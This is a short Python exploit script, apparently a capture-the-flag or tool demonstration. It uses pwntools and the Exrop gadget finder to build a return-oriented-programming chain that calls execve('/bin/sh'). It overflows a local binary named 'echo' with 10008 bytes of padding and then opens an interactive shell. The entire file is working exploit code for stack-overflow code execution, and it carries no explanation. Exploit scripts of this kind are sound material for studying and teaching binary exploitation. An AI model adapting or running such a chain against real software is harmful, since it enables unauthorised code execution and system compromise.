from pwn import *
import time
from Exrop import Exrop

binname = "echo"
libc = ELF(binname, checksec=False)
bss = libc.bss()

t = time.mktime(time.gmtime())
rop = Exrop(binname)
rop.find_gadgets(cache=True) # it's slow for first analyze keep waiting
print("Analyzing done in {}s".format(time.mktime(time.gmtime()) - t))
chain = rop.syscall(0x3b, ("/bin/sh",0,0), bss)
chain.dump()
buf = b"A"*10008
pay = buf + chain.payload_str()
p = process("./echo")
p.sendline(pay)
p.interactive()
